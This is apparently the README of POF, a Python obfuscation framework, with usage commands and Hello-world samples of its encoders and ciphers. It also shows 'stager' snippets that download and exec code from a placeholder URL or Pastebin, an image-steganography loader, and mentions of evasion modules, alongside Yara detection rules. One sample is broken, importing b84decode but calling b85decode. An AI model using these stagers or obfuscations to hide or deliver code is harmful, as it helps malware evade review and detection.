# POF

Python Obfuscation Framework.

Combine/chain obfuscation methods on a single Python source file.

## Install

```bash
git clone https://github.com/2O4/pof
cd pof
python -m venv venv
source ./venv/bin/activate
./setup.py install
```

This will install POF inside a virtual env.

## Usage

```bash
pof $SOURCE -o $OUT
```

Using the default chained obfuscator

```bash
pof in.py -o out.py
```

Using a specific obfuscator

```bash
pof in.py -o out.py -f obfuscator BuiltinsObfuscator
```

Using a specific payload

```bash
pof inf.py -o out.py -f payload GzipPayload
```

## Examples

These are examples of obfuscators of the script `print('Hello, world')`.

To reproduce the examples you can use the following command:

```bash
echo "print('Hello, world')" | pof -f obfuscator -k UUIDObfuscator
```

To test the validity of the output you can simply pipe it to Python:

```bash
echo "print('Hello, world')" | pof -f obfuscator -k UUIDObfuscator | python
```

### Obfuscator

#### BuiltinsObfuscator

Obfuscate builtins functions using one of the following methods.

```python
__builtins__.__getattribute__('print')('Hello, world')
```

```python
__builtins__.__dict__['print']('Hello, world')
```

```python
globals()['__builtins__'].__dict__['print']('Hello, world')
```

```python
__builtins__.__dict__.__getitem__('print')('Hello, world')
```

#### ConstantsObfuscator

Move every variables at the top of the file.

```python
vVlJ='Hello, world'
t4Bo=print
t4Bo(vVlJ)
```

#### ExtractVariablesObfuscator

Extract variables in the same context level, meaning if inside a function will add the variable at the beginning of it.

Note that right now this function is broken and can fail.

```python
var='Hello, world'
print(var)
```

#### StringsObfuscator

```python
print("".join([chr(ord(i)-3)for i in'Khoor/#zruog']))
```

```python
from base64 import b64decode
print(b64decode( b'SGVsbG8sIHdvcmxk').decode())
```

```python
print('\u0048\u0065\u006c\u006c\u006f\u002c\u0020\u0077\u006f\u0072\u006c\u0064')
```

```python
from base64 import b84decode
print(b85decode( b'NM&qnZ!92pZ*pv8').decode())
```

#### RC4Obfuscator

```python
import codecs
def rc4decrypt(key,ciphertext):
    def KSA(key):
        key_length=len(key)
        S=list(range(256))
        j=0
        for i in range(256):
            j=(j+S[i]+key[i%key_length])%256
            S[i],S[j]=S[j],S[i]
        return S
    def PRGA(S):
        i=0
        j=0
        while True:
            i=(i+1)%256
            j=(j+S[i])%256
            S[i],S[j]=S[j],S[i]
            K=S[(S[i]+S[j])%256]
            yield K
    def get_keystream(key):
        S=KSA(key)
        return PRGA(S)
    def encrypt_logic(key,text):
        key=[ord(c)for c in key]
        keystream=get_keystream(key)
        res=[]
        for c in text:
            val="%02X"%(c^next(keystream))
            res.append(val)
        return"".join(res)
    ciphertext=codecs.decode(ciphertext,"hex_codec")
    res=encrypt_logic(key,ciphertext)
    return codecs.decode(res,"hex_codec").decode("utf-8")

exec(rc4decrypt('7zSRE6YHmdwpx2zT1Q2xPoPwzztXRZNQSKeX2LFIKBhl7uJMAs9jj0Hlec6y3wjuNgqgdD1XjnqZSzkWhRldoWwn625Bw56r105zQg5KRE5ugmVOUy2adMWKH2hod0CfxW72XLGFDTt38OH5nDYcr2bXrokKDKCaie56agxxHmSwv4nwTNQlxjyrixBgeyjaDV8CLvdmS4ANRXXVs5HxhxlFiBBUoHadf1wLq0wDi5c0e93fmqqNCRHAMAoTkGJJPCfXc9kTHmW38NJcjnVgvAgrBIcJX66E8pLwUniQB0yvoHapq2RCxaV8PrhU0jFy9RWTrwDfoE3G7whrE8uobVUgFLiJsiH6eV63RvH03gUEi1EHo0YGrRo12yShLG0P8pfSawTjTkJlQOFQ2PsubnQm8fhZ6en7nHI2L2xpC88yNScapMnsRaYUHZFWdecVfOaq9QaMf76RzYpQ7F5LWKgcEG3WGiXReCU1hr5pAoomAcXMZftcYuJu5AuOsXSR','647F6846CBEF6C270D853D3F76650D51DE1CAD760C17'))
```

#### ShiftObfuscator

```python
exec("".join([chr(ord(i)-3)for i in'sulqw+*Khoor/#zruog*,\r']))
```

#### XORObfuscator

```python
from base64 import b64decode

def decrypt(cipher,key):
    bcipher=bytearray(b64decode(cipher))
    text=bytearray()
    ki=0
    for i in bcipher:
        text.append(i^key[ki%len(key)])
        ki+=1
    return text
exec(decrypt( b'RkNfWkAcHnxTXVpbGBROW0RdUhMdPg==', b'61644494').decode())
```

#### Bz2Obfuscator

```python
import bz2,marshal
exec(marshal.loads(bz2.decompress( b'BZh91AY&SY\xcf\xf8\xcd\xdc\x00\x00\ru\x80\xc0\x10\x01\x00@\xe4\x00@\x06%\xd4\x80\x08\x00 \x00"&\x80d\x196\xa1L&\x9a\x03LI\x99\\eR\x15\xcd\xb9\x04\xd4s\x1d\x08\x00\xf8\xbb\x92)\xc2\x84\x86\x7f\xc6n\xe0')))
```

#### GzipObfuscator

```python
import gzip,marshal
exec(marshal.loads(gzip.decompress( b'\x1f\x8b\x08\x00$p\x91d\x02\xff\xfb,\xc6\xc0\xc0PP\x94\x99W\xa2\xa1\xee\x91\x9a\x93\x93\xaf\xa3P\x9e_\x94\x93\xa2\xae\xc9\x05\x00\xf2\x90\x8eA\x1b\x00\x00\x00')))
```

#### LzmaObfuscator

```python
import lzma,marshal
exec(marshal.loads(lzma.decompress( b"\xfd7zXZ\x00\x00\x04\xe6\xd6\xb4F\x02\x00!\x01\x16\x00\x00\x00t/\xe5\xa3\x01\x00\x1a\xf3\x16\x00\x00\x00print('Hello, world')\n\x00\x00\xd5\xa4\x00\xec\xfa;\x9c\xf1\x00\x013\x1b\xf7\x19\x88^\x1f\xb6\xf3}\x01\x00\x00\x00\x00\x04YZ")))
```

#### ZlibObfuscator

```python
import zlib,marshal
exec(marshal.loads(zlib.decompress( b'x\x9c\xfb,\xc6\xc0\xc0PP\x94\x99W\xa2\xa1\xee\x91\x9a\x93\x93\xaf\xa3P\x9e_\x94\x93\xa2\xae\xc9\x05\x00va\x08H')))
```

#### CallObfuscator

```python
print.__call__('Hello, world')
```

#### ASCII85Obfuscator

```python
from base64 import a85decode
exec(a85decode('E,oZ1F=8M-ASc1$/0K.TEbo86.1-'))
```

#### Base16Obfuscator

```python
from base64 import b16decode
exec(b16decode('7072696E74282748656C6C6F2C20776F726C6427290A'))
```

#### Base32Obfuscator

```python
from base64 import b32decode
exec(b32decode('OBZGS3TUFATUQZLMNRXSYIDXN5ZGYZBHFEFA===='))
```

#### Base32HexObfuscator

```python
from base64 import b32hexdecode
exec(b32hexdecode('E1P6IRJK50JKGPBCDHNIO83NDTP6OP175450===='))
```

#### Base64Obfuscator

```python
from base64 import b64decode
exec(b64decode('cHJpbnQoJ0hlbGxvLCB3b3JsZCcpCg=='))
```

#### Base85Obfuscator

```python
from base64 import b85decode
exec(b85decode('aB^vGbSNiCWo&G3EFgDpa%^NLDGC'))
```

#### BinasciiObfuscator

```python
import binascii,marshal
exec(marshal.loads(binascii.a2b_base64( b'8xYAAABwcmludCgnSGVsbG8sIHdvcmxkJykK\n')))
```

#### SpacenTabObfuscator

```python
def sntdecode(encoded):
    msg_bin=encoded.replace(" ","0").replace("\t","1")
    n=int(msg_bin,2)
    return n.to_bytes((n.bit_length()+7)//8,"big")

exec(sntdecode('\t\t\t     \t\t\t  \t  \t\t \t  \t \t\t \t\t\t  \t\t\t \t    \t \t     \t  \t\t\t \t  \t    \t\t  \t \t \t\t \t\t   \t\t \t\t   \t\t \t\t\t\t  \t \t\t    \t      \t\t\t \t\t\t \t\t \t\t\t\t \t\t\t  \t  \t\t \t\t   \t\t  \t    \t  \t\t\t  \t \t  \t    \t \t '))
```

#### TokensObfuscator

```python
from tokenize import untokenize
exec(untokenize([(1,'print'),(54,'('),(3,"'Hello, world'"),(54,')'),(4,'\n'),(0,''),]))
```

#### DocstringObfuscator

```python
from base64 import b64decode
class Foo:
    """
    cHJpbnQoJ0hlbGxvLCB3b3JsZCcpCg==
    """
    pass


exec(b64decode(Foo.__doc__.replace('\n','').replace(' ','')))
```

#### IPv6Obfuscator

```python
import binascii
exec(binascii.a2b_hex(''.join(['7072:696e:7428:2748:656c:6c6f:2c20:776f','726c:6427:290a:1000:0000:0000:0000:0000',]).replace(':','').strip('0')[:-1]))
```

#### MACObfuscator

```python
import binascii
exec(binascii.a2b_hex(''.join(['70-72-69-6e-74-28','27-48-65-6c-6c-6f','2c-20-77-6f-72-6c','64-27-29-0a-10-00',]).replace('-','').strip('0')[:-1]))
```

#### UUIDObfuscator

```python
exec(binascii.a2b_hex("".join(['7072696e-7428-2748-656c-6c6f2c20776f','726c6427-290a-1000-0000-000000000000',]).replace("-","").strip('0')[:-1]))
```

### Stager

#### DownloadStager

```python
from urllib import request
exec(request.urlopen("http://link...").read())
```

#### ImageStager

Note that the modified picture is not included.

```python
import sys
from PIL import Image
def decode(im_in):
    msg_bin=""
    im=Image.open(im_in)
    px=im.load()
    for x in range(im.size[0]):
        for y in range(im.size[1]):
            pixels=px[x,y]
            msg_bin+=bin(pixels[0])[-1]
    n=8
    mmsg_bin="0"+msg_bin
    chunks=[mmsg_bin[i:i+n]for i in range(0,len(mmsg_bin),n)]
    i=chunks.index("0"*8)
    msg_bin=msg_bin[:(8*i)-1]
    n=int(msg_bin,2)
    msg=n.to_bytes((n.bit_length()+7)//8,"big").decode()
    return msg
exec(decode(sys.argv.pop(1)))
```

#### PastebinStager

```python
from urllib import request
exec(request.urlopen("https://pastebin.com/raw/...").read())
```

#### QuineStager

```python
from base64 import b64decode
from tokenize import untokenize
esource='cHJpbnQoJ0hlbGxvLCB3b3JsZCcpCg=='
tokens=[(1,'from'),(1,'base64'),(1,'import'),(1,'b64decode'),(4,'\n'),(1,'from'),(1,'tokenize'),(1,'import'),(1,'untokenize'),(4,'\n'),(1,'esource'),(54,'='),(4,'\n'),(1,'tokens'),(54,'='),(4,'\n'),(1,'def'),(1,'quine'),(54,'('),(54,')'),(54,':'),(4,'\n'),(5,' '),(1,'return'),(1,'untokenize'),(54,'('),(1,'tokens'),(54,'['),(54,':'),(2,'12'),(54,']'),(54,')'),(54,'+'),(1,'repr'),(54,'('),(1,'esource'),(54,')'),(54,'+'),(1,'untokenize'),(54,'('),(1,'tokens'),(54,'['),(2,'12'),(54,':'),(2,'15'),(54,']'),(54,')'),(54,'+'),(1,'repr'),(54,'('),(1,'tokens'),(54,')'),(54,'+'),(1,'untokenize'),(54,'('),(1,'tokens'),(54,'['),(2,'15'),(54,':'),(54,']'),(54,')'),(4,'\n'),(6,''),(1,'exec'),(54,'('),(1,'b64decode'),(7,'('),(1,'esource'),(8,')'),(54,')'),(4,'\n')]
def quine():
 return untokenize(tokens[:12])+repr(esource)+untokenize(tokens[12:15])+repr(tokens)+untokenize(tokens[15:])
exec(b64decode(esource))
```

## Yara

Yara rules can be used to detect malware, they can also be used to find interesting strings in Python source code. To check rules against source files and/or obfuscated files run:

```bash
yara --no-warning yara/python.yar file.py
```

## Development

### Project

- `pof` contains all the pof source code
  - `pof/obfuscator` contains obfuscators
  - `pof/stager` contains satgers
  - `pof/evasion` contains evasions
  - `pof/utils` all shared code between stager, obfuscator and evasion
- `wip` work in progress code that will eventually make its way inside the main code base
- `tests` unit tests for pof
- `scripts` some useful scripts to develop or use pof
- `yara` some yara rules to detect pof obfuscated code

### Setup

Using make.

```bash
python -m venv venv
source ./venv/bin/activate
pip install -r requirements.txt
pip install -r requirements.dev.txt
```

Run POF

```bash
./pof.py --help
```

### Run tests

```bash
pytest
```

### Code quality

```bash
make format
```

or

```bash
black .
ruff .
```

## TODO

- When installing (in setup.py) add txt files, homoglyphs.txt and names.txt
- Get the version (in setup.py) from `__init``.py`
- Resolve every ruff errors
- Increase test coverage
- Add pre-commit hooks
- Setup .gitignore
- Create repository on GitHub
- Setup package
- Publish package on pypi
- Write a doc
- Make project open-source
